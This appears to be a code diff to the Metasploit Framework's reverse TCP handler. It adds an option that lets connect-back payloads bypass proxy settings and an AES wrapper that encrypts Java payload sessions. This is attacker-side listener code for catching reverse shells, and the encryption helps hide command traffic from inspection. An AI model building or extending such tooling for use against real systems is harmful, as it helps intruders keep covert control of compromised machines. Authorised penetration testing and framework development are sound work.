@@ -1,3 +1,4 @@
+# -*- coding: binary -*-
 require 'rex/socket'
 require 'thread'
 
@@ -53,6 +54,7 @@ module ReverseTcp
 				OptInt.new('ReverseConnectRetries', [ true, 'The number of connection attempts to try before exiting the process', 5 ]),
 				OptAddress.new('ReverseListenerBindAddress', [ false, 'The specific IP address to bind to on the local system']),
 				OptString.new('ReverseListenerComm', [ false, 'The specific communication channel to use for this listener']),
+				OptBool.new('ReverseAllowProxy', [ true, 'Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST', false]),
 			], Msf::Handler::ReverseTcp)
 
 
@@ -65,8 +67,8 @@ module ReverseTcp
 	# if it fails to start the listener.
 	#
 	def setup_handler
-		if datastore['Proxies']
-			raise RuntimeError, 'TCP connect-back payloads cannot be used with Proxies'
+		if datastore['Proxies'] and not datastore['ReverseAllowProxy']
+			raise RuntimeError, 'TCP connect-back payloads cannot be used with Proxies. Can be overriden by setting ReverseAllowProxy to true'
 		end
 
 		ex = false
@@ -161,13 +163,58 @@ module ReverseTcp
 			while true
 				client = self.handler_queue.pop
 				begin
-					handle_connection(client)
+					handle_connection(wrap_aes_socket(client))
 				rescue ::Exception
 					elog("Exception raised from handle_connection: #{$!.class}: #{$!}\n\n#{$@.join("\n")}")
 				end
 			end
 		}
 
+	end
+	
+	def wrap_aes_socket(sock)
+		if datastore["PAYLOAD"] !~ /java\// or (datastore["AESPassword"] || "") == ""
+			return sock
+		end
+		
+		socks = Rex::Socket::tcp_socket_pair()
+		socks[0].extend(Rex::Socket::Tcp)
+		socks[1].extend(Rex::Socket::Tcp)
+		
+		m = OpenSSL::Digest::Digest.new('md5')
+		m.reset
+		key = m.digest(datastore["AESPassword"] || "")
+		
+		Rex::ThreadFactory.spawn('AESEncryption', false) {
+			c1 = OpenSSL::Cipher::Cipher.new('aes-128-cfb8')
+			c1.encrypt
+			c1.key=key
+			sock.put([0].pack('N'))
+			sock.put(c1.iv=c1.random_iv)
+			buf1 = socks[0].read(4096)
+			while buf1 and buf1 != ""
+				sock.put(c1.update(buf1))
+				buf1 = socks[0].read(4096)
+			end
+			sock.close()
+		}
+		Rex::ThreadFactory.spawn('AESEncryption', false) {
+			c2 = OpenSSL::Cipher::Cipher.new('aes-128-cfb8')
+			c2.decrypt
+			c2.key=key
+			iv=""
+			while iv.length < 16
+				iv << sock.read(16-iv.length)
+			end
+			c2.iv = iv
+			buf2 = sock.read(4096)
+			while buf2 and buf2 != ""
+				socks[0].put(c2.update(buf2))
+				buf2 = sock.read(4096)
+			end
+			socks[0].close()
+		}
+		return socks[1]
 	end
 
 	#
